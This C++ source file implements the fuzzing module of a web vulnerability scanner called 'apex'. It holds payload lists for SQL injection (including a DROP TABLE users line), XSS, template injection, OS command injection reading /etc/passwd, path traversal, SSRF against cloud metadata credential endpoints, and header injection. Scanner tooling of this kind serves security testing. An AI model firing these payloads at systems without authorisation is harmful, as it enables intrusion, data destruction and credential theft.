#include "fuzzer.hpp"
#include <algorithm>
#include <chrono>
#include <iostream>
#include <regex>
#include <random>
#include <cmath>

namespace apex {

Fuzzer::Fuzzer(HttpClient &http, const Config &config)
    : http_(http), config_(config) {}

std::vector<Finding> Fuzzer::fuzz_all(const CrawlResult &crawl) {
    std::vector<Finding> findings;
    auto targets = extract_targets(crawl);

    std::cout << "  [fuzzer] " << targets.size() << " fuzz targets identified\n";

    for (auto &target : targets) {
        auto baseline = get_baseline(target);
        auto payloads = generate_payloads(target.param, target.original_value);

        for (auto &payload : payloads) {
            auto result = send_fuzz(target, payload);
            if (is_anomalous(result, baseline)) {
                auto finding = classify_anomaly(result);
                if (finding.confidence > 0.5) {
                    findings.push_back(finding);
                    // Don't test more payloads for this vuln type on this param
                    break;
                }
            }
        }
    }
    return findings;
}

std::vector<FuzzResult> Fuzzer::fuzz_parameter(const FuzzTarget &target) {
    std::vector<FuzzResult> results;
    auto payloads = generate_payloads(target.param, target.original_value);

    for (auto &payload : payloads) {
        results.push_back(send_fuzz(target, payload));
    }
    return results;
}

std::vector<std::string> Fuzzer::generate_payloads(const std::string &param_name, const std::string &original_value) {
    std::vector<std::string> payloads;

    // Smart payload selection based on param name
    std::string lower_param = param_name;
    std::transform(lower_param.begin(), lower_param.end(), lower_param.begin(), ::tolower);

    // Always include type juggling and boundaries
    auto boundary = get_boundary_values();
    payloads.insert(payloads.end(), boundary.begin(), boundary.end());

    // ID-like params → IDOR
    if (lower_param.find("id") != std::string::npos || lower_param.find("uid") != std::string::npos ||
        lower_param.find("user") != std::string::npos || lower_param.find("account") != std::string::npos) {
        payloads.push_back("0");
        payloads.push_back("1");
        payloads.push_back("99999");
        payloads.push_back("-1");
        payloads.push_back(original_value.empty() ? "2" : std::to_string(std::stoi(original_value.empty() ? "1" : original_value) + 1));
    }

    // URL-like params → SSRF
    if (lower_param.find("url") != std::string::npos || lower_param.find("link") != std::string::npos ||
        lower_param.find("redirect") != std::string::npos || lower_param.find("next") != std::string::npos ||
        lower_param.find("return") != std::string::npos || lower_param.find("callback") != std::string::npos ||
        lower_param.find("dest") != std::string::npos || lower_param.find("target") != std::string::npos) {
        auto ssrf = get_ssrf_fuzz();
        payloads.insert(payloads.end(), ssrf.begin(), ssrf.end());
    }

    // File/path params → LFI
    if (lower_param.find("file") != std::string::npos || lower_param.find("path") != std::string::npos ||
        lower_param.find("page") != std::string::npos || lower_param.find("template") != std::string::npos ||
        lower_param.find("include") != std::string::npos || lower_param.find("doc") != std::string::npos) {
        auto path = get_path_fuzz();
        payloads.insert(payloads.end(), path.begin(), path.end());
    }

    // Search/query/name params → injection
    if (lower_param.find("search") != std::string::npos || lower_param.find("query") != std::string::npos ||
        lower_param.find("q") == 0 || lower_param.find("name") != std::string::npos ||
        lower_param.find("input") != std::string::npos || lower_param.find("value") != std::string::npos) {
        auto sqli = get_sqli_fuzz();
        auto xss = get_xss_fuzz();
        auto ssti = get_ssti_fuzz();
        payloads.insert(payloads.end(), sqli.begin(), sqli.end());
        payloads.insert(payloads.end(), xss.begin(), xss.end());
        payloads.insert(payloads.end(), ssti.begin(), ssti.end());
    }

    // Command params → CMDi
    if (lower_param.find("cmd") != std::string::npos || lower_param.find("exec") != std::string::npos ||
        lower_param.find("command") != std::string::npos || lower_param.find("ping") != std::string::npos ||
        lower_param.find("host") != std::string::npos || lower_param.find("ip") != std::string::npos) {
        auto cmdi = get_cmdi_fuzz();
        payloads.insert(payloads.end(), cmdi.begin(), cmdi.end());
    }

    // Generic: always add some SQLi/XSS/SSTI
    auto sqli_base = get_sqli_fuzz();
    auto xss_base = get_xss_fuzz();
    if (payloads.size() < 20) {
        payloads.insert(payloads.end(), sqli_base.begin(), sqli_base.begin() + std::min((size_t)5, sqli_base.size()));
        payloads.insert(payloads.end(), xss_base.begin(), xss_base.begin() + std::min((size_t)5, xss_base.size()));
    }

    // Unicode bypass variants
    auto unicode = get_unicode_bypass();
    payloads.insert(payloads.end(), unicode.begin(), unicode.end());

    return payloads;
}

std::vector<std::string> Fuzzer::get_sqli_fuzz() {
    return {
        "'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
        "' UNION SELECT NULL--", "1' AND '1'='1", "1' AND '1'='2",
        "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
        "1 OR 1=1", "' OR ''='", "admin'--", "') OR ('1'='1",
        "1'; DROP TABLE users--", "' AND 1=CONVERT(int,'a')--",
        "' HAVING 1=1--", "' GROUP BY 1--", "' ORDER BY 100--",
        ",-1 UNION SELECT 1,2,3--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    };
}

std::vector<std::string> Fuzzer::get_xss_fuzz() {
    return {
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>", "'-alert(1)-'",
        "<svg onload=alert(1)>", "javascript:alert(1)",
        "<img/src=x onerror=alert(1)>", "<<script>alert(1)<</script>",
        "\"><img src=x onerror=alert(1)>", "' onmouseover='alert(1)",
        "<body onload=alert(1)>", "<iframe src='javascript:alert(1)'>",
        "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
        "<math><mtext><table><mglyph><svg><mtext><style><path id=\"</style><img src=x onerror=alert(1)>\">",
        "<svg><animate onbegin=alert(1) attributeName=x>",
    };
}

std::vector<std::string> Fuzzer::get_ssti_fuzz() {
    return {
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{config}}", "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime()}", "{{''.__class__}}",
        "{{request.application.__globals__}}", "${globalThis}",
        "{{range.constructor(\"return this\")()}}", "#{7*'7'}",
        "{{''.__class__.__mro__[1].__subclasses__()}}", "<%=`id`%>",
    };
}

std::vector<std::string> Fuzzer::get_cmdi_fuzz() {
    return {
        ";id", "|id", "$(id)", "`id`", "||id",
        ";cat /etc/passwd", "|cat /etc/passwd",
        "$(cat /etc/passwd)", "&& id", "& id",
        "\nid\n", ";sleep 5", "|sleep 5",
        "$(sleep 5)", ";ping -c 3 127.0.0.1",
        "`sleep 5`", "${IFS}id", ";id${IFS}",
    };
}

std::vector<std::string> Fuzzer::get_path_fuzz() {
    return {
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd",
        "..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd", "/proc/self/environ",
        "....\/....\/....\/etc/passwd", "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%252f..%252f..%252fetc/passwd", "/var/log/apache2/access.log",
        "php://input", "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
    };
}

std::vector<std::string> Fuzzer::get_ssrf_fuzz() {
    return {
        "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/", "http://[::1]",
        "http://0x7f000001", "http://2130706433", "http://127.1",
        "http://0177.0.0.1", "http://127.0.0.1:22", "http://127.0.0.1:6379",
        "http://metadata.google.internal/", "gopher://127.0.0.1:25/",
        "dict://127.0.0.1:11211/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://100.100.100.200/latest/meta-data/", "https://evil.com",
        "//evil.com", "/\\evil.com", "http://evil.com",
    };
}

std::vector<std::string> Fuzzer::get_header_fuzz() {
    return {
        "\r\nX-Injected: true", "\r\nSet-Cookie: hacked=1",
        "\r\n\r\n<html>injected</html>", "%0d%0aX-Injected:%20true",
    };
}

std::vector<std::string> Fuzzer::get_type_juggle() {
    return {
        "[]", "{}", "null", "true", "false", "0", "-0",
        "NaN", "Infinity", "undefined", "''", "0x0",
        "Array", "Object", "[object Object]",
    };
}

std::vector<std::string> Fuzzer::get_boundary_values() {
    return {
        "", "0", "-1", "2147483647", "-2147483648", "4294967295",
        "9999999999999999999", "0.1", "1e308", "1e-308",
        std::string(10000, 'A'), // Buffer overflow test
        "AAAA%08x.%08x.%08x.%08x", // Format string
    };
}

std::vector<std::string> Fuzzer::get_unicode_bypass() {
    return {
        "\xc0\xae\xc0\xae/etc/passwd", // Overlong UTF-8 ../
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "%uff0e%uff0e/%uff0e%uff0e/etc/passwd", // Fullwidth dots
        "admin\xc0\x80", // Null byte
        "%00.php",
        "test\xe2\x80\x8b", // Zero-width space
    };
}

FuzzResult Fuzzer::send_fuzz(const FuzzTarget &target, const std::string &payload) {
    FuzzResult result;
    result.url = target.url;
    result.param = target.param;
    result.payload = payload;
    result.original_value = target.original_value;

    auto start = std::chrono::steady_clock::now();

    std::string fuzz_url = target.url;
    if (target.method == "GET") {
        // Replace param value in URL
        std::string search = target.param + "=" + target.original_value;
        std::string replace = target.param + "=" + payload;
        size_t pos = fuzz_url.find(search);
        if (pos != std::string::npos) {
            fuzz_url.replace(pos, search.length(), replace);
        } else {
            // Append parameter
            fuzz_url += (fuzz_url.find('?') != std::string::npos ? "&" : "?");
            fuzz_url += target.param + "=" + payload;
        }
        auto resp = http_.get(fuzz_url);
        result.status_code = resp.status_code;
        result.response_length = resp.body.size();

        // Check for reflection
        if (resp.body.find(payload) != std::string::npos) {
            result.anomaly = "payload_reflected";
            result.anomaly_score = 0.7;
        }
        // Check for errors
        if (resp.body.find("error") != std::string::npos || resp.body.find("exception") != std::string::npos ||
            resp.body.find("stack trace") != std::string::npos || resp.body.find("SQL") != std::string::npos) {
            result.anomaly = "error_triggered";
            result.anomaly_score = 0.8;
            result.evidence = resp.body.substr(0, 500);
        }
    } else {
        std::string body = target.param + "=" + payload;
        auto resp = http_.post(target.url, body, target.content_type.empty() ? "application/x-www-form-urlencoded" : target.content_type);
        result.status_code = resp.status_code;
        result.response_length = resp.body.size();
        if (resp.body.find(payload) != std::string::npos) {
            result.anomaly = "payload_reflected";
            result.anomaly_score = 0.7;
        }
    }

    auto end = std::chrono::steady_clock::now();
    result.response_time_ms = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();

    return result;
}

FuzzResult Fuzzer::get_baseline(const FuzzTarget &target) {
    FuzzResult baseline;
    baseline.url = target.url;
    baseline.param = target.param;
    baseline.original_value = target.original_value;

    auto start = std::chrono::steady_clock::now();
    auto resp = http_.get(target.url);
    auto end = std::chrono::steady_clock::now();

    baseline.status_code = resp.status_code;
    baseline.response_length = resp.body.size();
    baseline.response_time_ms = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();

    return baseline;
}

bool Fuzzer::is_anomalous(const FuzzResult &result, const FuzzResult &baseline) {
    // Status code changed significantly
    if (result.status_code == 500 && baseline.status_code == 200) return true;
    if (result.status_code == 403 && baseline.status_code == 200) return true;

    // Response size changed dramatically (>50% diff)
    if (baseline.response_length > 0) {
        double ratio = (double)result.response_length / baseline.response_length;
        if (ratio > 2.0 || ratio < 0.3) return true;
    }

    // Timing anomaly (>3x slower = possible time-based injection)
    if (result.response_time_ms > baseline.response_time_ms * 3 && result.response_time_ms > 3000) return true;

    // Explicit anomaly detected during send
    if (result.anomaly_score > 0.5) return true;

    return false;
}

Finding Fuzzer::classify_anomaly(const FuzzResult &result) {
    Finding f;
    f.url = result.url;
    f.param = result.param;
    f.payload = result.payload;

    // Classify based on payload type and response
    if (result.payload.find("'") != std::string::npos || result.payload.find("UNION") != std::string::npos ||
        result.payload.find("SLEEP") != std::string::npos || result.payload.find("WAITFOR") != std::string::npos) {
        if (result.anomaly == "error_triggered" && result.evidence.find("SQL") != std::string::npos) {
            f.type = "SQL Injection (Fuzzed)";
            f.severity = "critical";
            f.confidence = 0.9;
            f.cwe_id = "CWE-89";
            f.cvss_score = 9.8;
        } else if (result.response_time_ms > 5000) {
            f.type = "Blind SQL Injection (Time-based)";
            f.severity = "critical";
            f.confidence = 0.85;
            f.cwe_id = "CWE-89";
            f.cvss_score = 9.8;
        } else {
            f.type = "SQL Injection Indicator";
            f.severity = "high";
            f.confidence = 0.6;
            f.cwe_id = "CWE-89";
            f.cvss_score = 7.5;
        }
    } else if (result.payload.find("<script") != std::string::npos || result.payload.find("onerror") != std::string::npos ||
               result.payload.find("alert(") != std::string::npos) {
        if (result.anomaly == "payload_reflected") {
            f.type = "Reflected XSS (Fuzzed)";
            f.severity = "high";
            f.confidence = 0.85;
            f.cwe_id = "CWE-79";
            f.cvss_score = 6.1;
        } else {
            f.type = "XSS Indicator";
            f.severity = "medium";
            f.confidence = 0.5;
            f.cwe_id = "CWE-79";
            f.cvss_score = 4.3;
        }
    } else if (result.payload.find("{{") != std::string::npos || result.payload.find("${") != std::string::npos) {
        if (result.anomaly == "payload_reflected" &&
            (result.evidence.find("49") != std::string::npos || result.evidence.find("config") != std::string::npos)) {
            f.type = "Server-Side Template Injection (Fuzzed)";
            f.severity = "critical";
            f.confidence = 0.9;
            f.cwe_id = "CWE-1336";
            f.cvss_score = 9.8;
        }
    } else if (result.payload.find("etc/passwd") != std::string::npos) {
        if (result.evidence.find("root:") != std::string::npos) {
            f.type = "Local File Inclusion (Fuzzed)";
            f.severity = "critical";
            f.confidence = 0.95;
            f.cwe_id = "CWE-22";
            f.cvss_score = 8.6;
        }
    } else if (result.payload.find("127.0.0.1") != std::string::npos || result.payload.find("169.254") != std::string::npos) {
        f.type = "SSRF Indicator (Fuzzed)";
        f.severity = "high";
        f.confidence = 0.6;
        f.cwe_id = "CWE-918";
        f.cvss_score = 7.5;
    } else if (result.payload.find(";") != std::string::npos && result.payload.find("id") != std::string::npos) {
        if (result.evidence.find("uid=") != std::string::npos) {
            f.type = "OS Command Injection (Fuzzed)";
            f.severity = "critical";
            f.confidence = 0.95;
            f.cwe_id = "CWE-78";
            f.cvss_score = 10.0;
        }
    }

    if (f.type.empty()) {
        f.type = "Anomalous Response (Fuzzed)";
        f.severity = "low";
        f.confidence = 0.4;
    }

    f.detail = "Fuzzer anomaly: " + result.anomaly + " (score=" + std::to_string(result.anomaly_score) + ")";
    f.evidence = result.evidence.substr(0, 200);
    return f;
}

std::vector<FuzzTarget> Fuzzer::extract_targets(const CrawlResult &crawl) {
    std::vector<FuzzTarget> targets;

    // From URL params
    for (auto &url : crawl.urls) {
        auto qpos = url.find('?');
        if (qpos == std::string::npos) continue;
        std::string query = url.substr(qpos + 1);
        std::string base = url;

        // Parse each param
        size_t pos = 0;
        while (pos < query.size()) {
            auto eq = query.find('=', pos);
            if (eq == std::string::npos) break;
            auto amp = query.find('&', eq);
            std::string param = query.substr(pos, eq - pos);
            std::string value = (amp != std::string::npos) ? query.substr(eq + 1, amp - eq - 1) : query.substr(eq + 1);

            targets.push_back({base, param, value, "GET", ""});

            pos = (amp != std::string::npos) ? amp + 1 : query.size();
        }
    }

    // From forms
    for (auto &form : crawl.forms) {
        for (auto &field : form.fields) {
            FuzzTarget ft;
            ft.url = form.action;
            ft.param = field.name;
            ft.original_value = "";
            ft.method = "POST";
            ft.content_type = "application/x-www-form-urlencoded";
            targets.push_back(ft);
        }
    }

    // Deduplicate by param name (test each param only once)
    std::map<std::string, bool> seen;
    std::vector<FuzzTarget> deduped;
    for (auto &t : targets) {
        std::string key = t.param + "@" + t.url.substr(0, t.url.find('?'));
        if (!seen[key]) {
            seen[key] = true;
            deduped.push_back(t);
        }
    }
    return deduped;
}

std::string Fuzzer::mutate_payload(const std::string &payload) {
    static thread_local std::mt19937 rng(std::random_device{}());
    std::string mutated = payload;

    // Random mutations
    std::uniform_int_distribution<int> dist(0, 5);
    switch (dist(rng)) {
        case 0: // Double encode
            for (auto &c : mutated) {
                if (c == '<') { mutated = "%253C" + mutated.substr(1); break; }
                if (c == '\'') { mutated = "%2527" + mutated.substr(1); break; }
            }
            break;
        case 1: // Case swap
            for (auto &c : mutated) {
                if (std::isalpha(c)) c = std::isupper(c) ? std::tolower(c) : std::toupper(c);
            }
            break;
        case 2: // Insert null byte
            mutated.insert(mutated.size() / 2, "%00");
            break;
        case 3: // Add comment (SQL)
            mutated += "/**/";
            break;
        case 4: // URL encode
            break; // Keep as-is
        case 5: // Append junk
            mutated += "AAAA";
            break;
    }
    return mutated;
}

} // namespace apex
